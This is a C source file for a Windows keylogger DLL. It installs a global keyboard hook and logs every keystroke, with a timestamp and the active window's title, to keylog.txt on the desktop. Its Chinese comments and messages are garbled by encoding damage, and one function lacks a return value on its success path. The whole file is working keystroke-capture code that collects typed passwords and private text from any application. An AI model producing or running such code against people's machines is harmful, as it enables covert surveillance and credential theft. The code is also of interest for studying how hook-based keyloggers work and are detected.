#define EXPORTS
#include "hKey.h"


BOOL InstallHook(){
    // ȫ�ֹ���
    g_hook = SetWindowsHookEx(WH_KEYBOARD, keyboardProc, GetModuleHandleA("KeyLog"), 0);
    if (g_hook == NULL) {
        MessageBoxA(NULL, "�ҹ���װʧ�ܣ�", "��ʾ", MB_OK);
        ShowError("SetWindowsHookEx");
        return FALSE;
    }
    
    SetSavePath();
    MessageBoxA(NULL, "�ҹ���װ�ɹ���", "��ʾ", MB_OK);
    return TRUE;
}

BOOL UninstallHook(){
    if (UnhookWindowsHookEx(g_hook)) {
        MessageBoxA(NULL, "�ҹ�ж�سɹ���", "��ʾ", MB_OK);
        return TRUE;
    }
    MessageBoxA(NULL, "�ҹ�ж��ʧ�ܣ�", "��ʾ", MB_OK);
    ShowError("UnhookWindowsHookEx");
    return FALSE;
}

LRESULT keyboardProc(int ncode, WPARAM wParam, LPARAM lParam){
    // ��¼����
    if (ncode < 0 || ncode == HC_NOREMOVE)
        return CallNextHookEx(g_hook, ncode, wParam, lParam);

    // ����̧��ʱ
    if (lParam & 0x40000000) 
        return CallNextHookEx(g_hook, ncode, wParam, lParam);
    
    // ��ȡ����
    char szKeyName[50] = { 0 };
    GetKeyNameTextA(lParam, szKeyName, 50);

    // ��¼����
    if (SaveKey(szKeyName) == FALSE)
        return CallNextHookEx(g_hook, ncode, wParam, lParam);

    return CallNextHookEx(g_hook, ncode, wParam, lParam);
}

VOID SetSavePath(){
    // ��ȡ����·��
    char DesktopPath[MAX_PATH];
    SHGetSpecialFolderPathA(NULL, DesktopPath, CSIDL_DESKTOP, FALSE);
    sprintf_s(LogFilePath, MAX_PATH, "%s/keylog.txt", DesktopPath);
}

BOOL SaveKey(const char* KeyName) {
    FILE* fp = NULL;
    fopen_s(&fp, LogFilePath, "a");
    if(fp == NULL)
        return FALSE;

    // ��ȡϵͳʱ��
    char sTime[50];
    SYSTEMTIME LT;
    GetLocalTime(&LT);
    sprintf_s(sTime, 50, "%4u-%02u-%02u %02u:%02u", 
        LT.wYear, LT.wMonth, LT.wDay, LT.wHour, LT.wMinute);

    // ��ȡ���㴰�ڱ���
    char sTitle[256] = { 0 };
    HWND hForegroundWnd = GetForegroundWindow();
    GetWindowTextA(hForegroundWnd, sTitle, 256);

    // д���ļ�
    char KeyMsg[256] = { 0 };
    sprintf_s(KeyMsg, 256, "[%s]-[%s]-[%s]\n", sTime, sTitle, KeyName);
    fwrite(KeyMsg, sizeof(char), strlen(KeyMsg), fp);
    fclose(fp);
}

VOID ShowError(const char* FuncName) {
    // ��ȡ������Ϣ
    char msg[256] = { 0 };
    sprintf_s(msg, 256, "[Error - %s]:\t%u", FuncName, GetLastError());
    MessageBoxA(NULL, msg, "����", MB_OK);
}